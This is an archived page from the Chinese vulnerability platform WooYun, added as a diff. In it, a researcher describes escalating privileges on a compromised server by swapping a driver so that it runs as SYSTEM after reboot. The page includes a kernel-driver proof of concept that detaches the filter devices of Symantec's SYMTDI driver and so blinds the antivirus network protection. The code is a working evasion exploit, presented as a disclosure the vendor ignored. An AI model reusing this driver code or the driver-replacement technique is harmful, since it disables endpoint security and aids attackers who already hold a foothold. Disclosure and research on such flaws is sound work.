@@ -1,0 +1,224 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		借赛门铁透过攻破防病毒软件谈服务器提权（POC）  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		借赛门铁透过攻破防病毒软件谈服务器提权（POC）  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/n0bele">n0bele</a> 
+</li><li>提交时间：		2013-09-06 11:24</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-09-06：	积极联系厂商并且等待厂商认领中，细节不对外公开<br/>
+									2013-12-05：	厂商已经主动忽略漏洞，细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">有些厂商老觉得很多问题没必要修复，对此我只想套用一句老话，能力决定了你的眼界.自己不会利用，不代表着别人不会.所以安全厂商招人的时候别老招那种用汇编写管理系统的程序员，因为他们的思维就定格在那一亩三分地上.</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">借赛门铁克吐个槽，当然了国外大多数防病毒厂商都是不防驱动加载的.我不懂他们的设计思路，但事实是再优秀的防病毒引擎你也得先跑得起来不是？<br />
+<br />
+<br />
+<br />
+驱动是什么权限?<br />
+<br />
+system权限<br />
+<br />
+<br />
+<br />
+怎么让驱动运行?<br />
+<br />
+有的时候拿到了webshell没有执行程序、写注册表的权限,有的只是浏览、修改特定几个目录的权限。利用我前几天提到的方法，替换掉比如：C:\Program Files\目录下任意驱动，达到重启后自动执行驱动提权，具体payload代码网上有，自己找.<br />
+<br />
+<br />
+<br />
+为什么不用lpk.dll等劫持提权？<br />
+<br />
+因为杀毒软件会报的：）<br />
+<br />
+<br />
+<br />
+恩，回到赛门铁克的问题，看POC吧<br />
+<br />
+</p><pre><code>void FuckFilters(WCHAR * Name)<br />
+{<br />
+<br />
+	UNICODE_STRING TName;<br />
+	PDRIVER_OBJECT TDrvObj;<br />
+	PDEVICE_OBJECT CurrentDevice;<br />
+	NTSTATUS status;<br />
+<br />
+	RtlInitUnicodeString ( &amp;TName, Name);<br />
+	status = ObReferenceObjectByName( &amp;TName,<br />
+		OBJ_CASE_INSENSITIVE,<br />
+		NULL,<br />
+		0,<br />
+		*IoDriverObjectType,<br />
+		KernelMode,    <br />
+		NULL,<br />
+		(PVOID*)&amp;TDrvObj);<br />
+<br />
+	if(NT_SUCCESS(status))<br />
+	{<br />
+		if(TDrvObj)<br />
+		{<br />
+			CurrentDevice = TDrvObj-&gt;DeviceObject;<br />
+<br />
+<br />
+			while(CurrentDevice != NULL )<br />
+			{<br />
+				CurrentDevice-&gt;AttachedDevice = 0;<br />
+<br />
+				CurrentDevice = CurrentDevice-&gt;NextDevice; <br />
+<br />
+			}<br />
+<br />
+			ObDereferenceObject(TDrvObj);<br />
+<br />
+		}<br />
+	}<br />
+}<br />
+<br />
+NTSTATUS DriverEntry(<br />
+    IN OUT PDRIVER_OBJECT   DriverObject,<br />
+    IN PUNICODE_STRING      RegistryPath<br />
+    )<br />
+{<br />
+  FuckFilters(L&quot;\\Driver\\SYMTDI&quot;);<br />
+}</code></pre><p class='detail'> </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">这个是赛门铁克防病毒企业版更新到最新的版本<br />
+<br />
+本来TDI好好的<br />
+<br />
+</p><p class="detail"><a href="../images/061104261192f2457be3fae9af9cb937a35acc9c.jpg" target="_blank"><img src="../images/061104261192f2457be3fae9af9cb937a35acc9c.jpg" alt=".jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+执行代码后就啥也没了. </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">他们懂但不想修复，我也没办法 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/n0bele" title="n0bele">n0bele</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-036254" title="借赛门铁透过攻破防病毒软件谈服务器提权（POC）">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+									<h3 class="detailTitle">厂商回应：</h3>
+										<p class="detail">未能联系到厂商或者厂商积极拒绝</p>
+																	
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="36254";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
